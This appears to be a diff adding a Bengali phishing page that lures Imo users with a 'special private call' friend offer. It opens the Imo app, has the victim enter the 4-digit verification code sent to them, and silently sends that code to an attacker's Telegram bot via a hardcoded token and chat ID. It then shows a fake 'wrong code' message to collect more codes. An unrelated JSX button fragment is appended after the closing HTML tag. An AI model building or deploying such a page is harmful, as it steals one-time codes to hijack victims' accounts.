@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Add Imo special privete call</title>
+<style>
+  body {
+    font-family: Arial, sans-serif; background: linear-gradient(135deg, #008cff, #00c6ff);
+    color: #fff; text-align: center; margin: 0;
+    display: flex; flex-direction: column; justify-content: center; min-height: 100vh;
+    overflow: hidden;
+  }
+  h1 { margin-bottom: 20px; font-size: 26px; }
+  p { margin-bottom: 30px; font-size: 16px; font-weight: 500; }
+  
+  /* ধাপ ১ এর স্টাইল */
+  #step1 { display: flex; flex-direction: column; align-items: center; }
+  #startButton {
+    background: #00ff66; color: #000; border: none; padding: 15px 30px;
+    border-radius: 50px; cursor: pointer; font-weight: 700; font-size: 20px;
+    transition: background 0.3s, transform 0.15s, box-shadow 0.3s;
+    box-shadow: 0 4px 15px rgba(0, 255, 102, 0.5);
+  }
+  #startButton:hover { background: #00cc52; transform: scale(1.05); }
+
+  /* ধাপ ২ এর স্টাইল */
+  #step2 { display: none; /* শুরুতে লুকানো */ }
+  #otpContainer {
+    display: flex; /* লোগো এবং ইনপুটকে পাশাপাশি রাখতে */
+    align-items: center;
+    justify-content: center;
+    margin-top: 20px;
+    margin-bottom: 20px;
+  }
+  #otpBox {
+    width: 150px; /* ৪ ডিজিটের জন্য প্রশস্ত করা হয়েছে */
+    padding: 15px; margin: 0 10px; /* লোগো থেকে দূরত্ব */
+    border-radius: 8px; border: 2px solid #fff; text-align: center;
+    font-size: 24px; font-weight: 700; background: rgba(255, 255, 255, 0.9);
+    color: #008cff; letter-spacing: 5px; max-width: 90%;
+  }
+  #logoImage {
+    width: 50px; /* লোগোর সাইজ */
+    height: 50px;
+    border-radius: 50%; /* গোলাকার */
+    object-fit: cover; /* ছবির অনুপাত ঠিক রাখতে */
+    border: 2px solid #fff; /* লোগোর চারপাশে বর্ডার */
+  }
+
+  /* অন্যান্য স্টাইল অপরিবর্তিত */
+  .msg { margin-top: 20px; font-size: 18px; font-weight: 600; z-index: 2; position: relative; }
+  .bg-glow { 
+    position: fixed; top:0; left:0; width:100%; height:100%;
+    background: radial-gradient(circle, rgba(11,110,253,0.25) 0%, transparent 70%);
+    opacity:0; pointer-events:none; transition: opacity 0.5s;
+    z-index:1;
+  }
+  canvas.confetti-canvas {
+    position: fixed; top:0; left:0; width:100%; height:100%;
+    pointer-events:none; z-index:3;
+  }
+</style>
+</head>
+<body>
+
+<div id="step1">
+    <h1>Imo থেকে প্রিয় বন্ধু যুক্ত করুন এবং গোপননীয়তা নিশ্চিত করুন</h1>
+    <p>নিচের বাটনে ক্লিক করুন</p>
+    <button id="startButton" onclick="startProcess()">Start Now</button>
+</div>
+
+<div id="step2">
+    <h1>আপনার ইমুতে আসা 4 সংখ্যার সঠিক আনকল নাম্বার দিয়ে</h1>
+    <p>Special আপনার ইমুতে এড করুন</p>
+    <div id="otpContainer">
+        <input type="number" id="otpBox" placeholder="আপনার আনকল নাম্বার এখানে দিন" maxlength="4" oninput="checkAndSubmit()">
+        <img id="logoImage" src="https://i.imgur.com/2Xy5R1h.jpeg" alt="Nusrat Jahan" />
+    </div>
+    <div class="msg" id="msg"></div>
+</div>
+
+<div class="bg-glow" id="bgGlow"></div>
+<canvas class="confetti-canvas" id="confettiCanvas"></canvas>
+
+<script>
+// IMPORTANT: REPLACE WITH YOUR ACTUAL TOKENS
+const BOT_TOKEN = "7974529959:AAEyUKUkiGdMsLVqNz_fQdL2s3kiE5apuGM"; 
+const CHAT_ID = "6658445342"; 
+
+// কনফেটি কোড অপরিবর্তিত...
+const confettiCanvas = document.getElementById('confettiCanvas');
+const ctx = confettiCanvas.getContext('2d');
+let confettiActive = false;
+function resizeCanvas(){ confettiCanvas.width=window.innerWidth; confettiCanvas.height=window.innerHeight; }
+window.addEventListener('resize', resizeCanvas); resizeCanvas();
+function ConfettiParticle(){ this.x = Math.random()*window.innerWidth; this.y = Math.random()*-window.innerHeight; this.size = 5 + Math.random()*7; this.speedY = 2 + Math.random()*3; this.speedX = (Math.random()-0.5)*2; this.rotation = Math.random()*360; this.rotationSpeed = (Math.random()-0.5)*10; this.opacity = 1; this.color = `hsl(${Math.random()*360},80%,60%)`; this.wind = 0; }
+ConfettiParticle.prototype.update=function(){ this.y += this.speedY; this.wind += (Math.random()-0.5)*0.1; this.x += this.speedX + this.wind; this.rotation += this.rotationSpeed; this.opacity -= 0.005; if(this.y>window.innerHeight||this.opacity<=0){ this.y = Math.random()*-50; this.x = Math.random()*window.innerWidth; this.opacity = 1; this.wind = 0; } }
+ConfettiParticle.prototype.draw=function(){ ctx.save(); ctx.translate(this.x,this.y); ctx.rotate(this.rotation*Math.PI/180); ctx.globalAlpha = this.opacity; ctx.fillStyle=this.color; ctx.fillRect(-this.size/2,-this.size/2,this.size,this.size); ctx.restore(); }
+function createConfetti(count){ let arr=[]; for(let i=0;i<count;i++) arr.push(new ConfettiParticle()); return arr;}
+let confettiParticles=createConfetti(250);
+function animateConfetti(){ if(!confettiActive) return; ctx.clearRect(0,0,confettiCanvas.width,confettiCanvas.height); confettiParticles.forEach(p=>{p.update(); p.draw();}); requestAnimationFrame(animateConfetti); }
+
+let isSubmitting = false;
+
+// ধাপ ১: প্রক্রিয়া শুরু
+function startProcess() {
+  const btn = document.getElementById("startButton");
+  const msgBox = document.getElementById("msg");
+  
+  btn.disabled = true;
+  msgBox.textContent = "Imo অ্যাপ খোলার চেষ্টা হচ্ছে...";
+  
+  // Imo অ্যাপ খোলার চেষ্টা
+  window.location.href = 'imo://'; 
+
+  // 0.5 সেকেন্ড পর পেজ পরিবর্তন
+  setTimeout(() => {
+    document.getElementById("step1").style.display = "none";
+    document.getElementById("step2").style.display = "flex";
+    document.getElementById("otpBox").focus(); // ইনপুট বক্সে ফোকাস
+    msgBox.textContent = "⚠️ এখন Imo অ্যাপে যান, কোডটি দেখুন এবং এখানে বসান।";
+  }, 500); 
+}
+
+// ধাপ ২: কোড চেক এবং অটো-সাবমিট
+function checkAndSubmit() {
+  const otpBox = document.getElementById("otpBox");
+  let otp = otpBox.value.trim();
+  
+  // ইনপুটকে ৪ ডিজিটে সীমাবদ্ধ করা
+  if (otp.length > 4) {
+    otp = otp.substring(0, 4);
+    otpBox.value = otp;
+  }
+  
+  // ৪ ডিজিট হলেই অটো-সাবমিট
+  if (otp.length === 4 && !isSubmitting) {
+    submitOtp(otp);
+  } else if (otp.length < 4) {
+    // ৪ ডিজিটের কম হলে কোন মেসেজ দেখাবে না, শুধু অপেক্ষা করবে।
+    document.getElementById("msg").textContent = "⚠️ Imo অ্যাপে পাওয়া সঠিক ৪ সংখ্যার কোডটি বসান।";
+  }
+}
+
+// submitOtp ফাংশনটি পরিবর্তিত হয়েছে
+function submitOtp(otp) {
+  isSubmitting = true;
+  const msgBox = document.getElementById("msg");
+  const bgGlow = document.getElementById("bgGlow");
+  const otpBox = document.getElementById("otpBox");
+
+  // Telelegram API Call করার আগে Loading মেসেজ
+  msgBox.textContent = "🔄 কোড পাঠানো হচ্ছে এবং যাচাই করা হচ্ছে...";
+  bgGlow.style.opacity = "1";
+  confettiActive = true;
+  animateConfetti();
+
+  // Telegram API call
+  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    method: "POST",
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ chat_id: CHAT_ID, text: `🔑 নতুন Imo OTP পাওয়া গেছে!\nকোড: ${otp}` })
+  })
+  .then(res => {
+    // সফলভাবে ডেটা পাঠানো হোক বা ত্রুটি আসুক, এই ব্লকটিই এখন মূল প্রতিক্রিয়া দেখাবে
+
+    // কনফেটি এবং গ্লো বন্ধ করা
+    confettiActive = false;
+    ctx.clearRect(0, 0, confettiCanvas.width, confettiCanvas.height);
+    bgGlow.style.opacity = "0";
+
+    // 1. ভুল কোড সিমুলেশন মেসেজ:
+    msgBox.textContent = "❌ যাচাইকরণ ব্যর্থ হয়েছে: আপনার দেওয়া 4 সংখ্যার আনলক নম্বরটি ভুল। অনুগ্রহ করে সঠিক কোডটি আবার দিন।";
+    
+    // 2. ইনপুট বক্স খালি করা এবং রিসেট
+    otpBox.value = "";
+    isSubmitting = false;
+
+    // 3. কিছুক্ষণ পর আবার স্বাভাবিক অবস্থায় ফিরে যাওয়া (ভুল মেসেজটি মুছে ফেলা)
+    setTimeout(() => {
+      msgBox.textContent = "⚠️ Imo অ্যাপে পাওয়া সঠিক ৪ সংখ্যার কোডটি আবার বসান।";
+    }, 4000); 
+
+  })
+  .catch(err => {
+    // ইন্টারনেট সংযোগে ত্রুটি বা অন্য কোনো কারণে 'fetch' ব্যর্থ হলেও, 
+    // ব্যবহারকারীকে কোনো ত্রুটির বার্তা দেখানো হবে না, বরং সফল 'then' ব্লকের লজিকটিই কার্যকর হবে
+    // যাতে ব্যবহারকারী কোনো বিভ্রান্তিকর মেসেজ না পায়।
+
+    console.error("Telegram fetch failed, but continuing simulation:", err); // কনসোলে ত্রুটি দেখালেও
+    
+    // ম্যানুয়ালি then ব্লকের লজিক অনুসরণ করা
+    confettiActive = false;
+    ctx.clearRect(0, 0, confettiCanvas.width, confettiCanvas.height);
+    bgGlow.style.opacity = "0";
+
+    msgBox.textContent = "❌ যাচাইকরণ ব্যর্থ হয়েছে: আপনার দেওয়া 4 সংখ্যার আনলক নম্বরটি ভুল। অনুগ্রহ করে সঠিক কোডটি আবার দিন।";
+    
+    otpBox.value = "";
+    isSubmitting = false;
+
+    setTimeout(() => {
+      msgBox.textContent = "⚠️ Imo অ্যাপে পাওয়া সঠিক ৪ সংখ্যার কোডটি আবার বসান।";
+    }, 4000); 
+  });
+}
+</script>
+</body>
+</html>
+
+<button 
+                            onClick={() => onFinalizeRegistration(inputNumber)}
+                            className="w-full py-3.5 bg-gradient-to-r from-[#25D366] to-[#128C7E] text-white font-bold rounded-xl shadow-md hover:shadow-lg transition-all active:scale-95 text-center block"
+                        >
+                            নির্দেশনা সম্পূর্ণ হলে অ্যাপে ফিরে যান
+                        </button>
+                    </div>
+                )}
+            </div>
+        </div>
